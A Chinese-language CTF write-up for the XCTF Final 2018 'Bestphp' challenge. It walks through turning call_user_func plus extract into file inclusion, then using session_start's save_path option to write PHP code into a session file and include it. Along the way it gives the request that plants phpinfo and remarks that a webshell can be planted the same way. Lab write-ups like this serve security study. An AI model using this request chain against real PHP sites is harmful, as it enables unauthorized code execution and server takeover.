# XCTF-Final-2018-Bestphp
```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    ini_set('open_basedir', '/var/www/html:/tmp');
    $file = 'function.php';
    $func = isset($_GET['function'])?$_GET['function']:'filters'; 
    call_user_func($func,$_GET);
    include($file);
    session_start();
    $_SESSION['name'] = $_POST['name'];
    if($_SESSION['name']=='admin'){
        header('location:admin.php');
    }
?>
```

### 文件包含

可以发现 `call_user_func($func,$_GET);` 未做任何过滤，而后面有 `include($file);` 因此可利用 `extract` 进行变量覆盖，实现文件包含。

由于这里读取 `admin.php` 与 `function.php` 对解题没用，就不贴代码了。

### session_start 函数
继续往后看，发现 session 值可控，session 默认保存在以下位置：
```
/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID

/var/lib/php5/sess_PHPSESSID
/var/lib/php5/sessions/sess_PHPSESSID

/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
```
`/tmp` 目录下无法找到 session，因此 session 应该在 `/var/lib` 目录下。但由于 `ini_set('open_basedir', '/var/www/html:/tmp');` 的设置，无法包含 /var/lib 下的 session。

`session_start` 函数存在 `options` 数组参数，如果提供会覆盖 session 配置项，而其中包含了 `save_path`，可用来修改 session 保存位置。

因此思路是传入 `session_start` 函数修改存储位置。

尝试直接写到根目录
```shell
http --form post "http://127.0.0.1:8003/?function=session_start&save_path=."  name='<?php phpinfo(); ?>' Cookie:PHPSESSID=ivs6beep0k4oniqru15iap6bb3
```

访问 `http://127.0.0.1:8003/?function=extract&file=sess_ivs6beep0k4oniqru15iap6bb3` 显示了 phpinfo 页面。

再用同样的方式写 shell 即可。
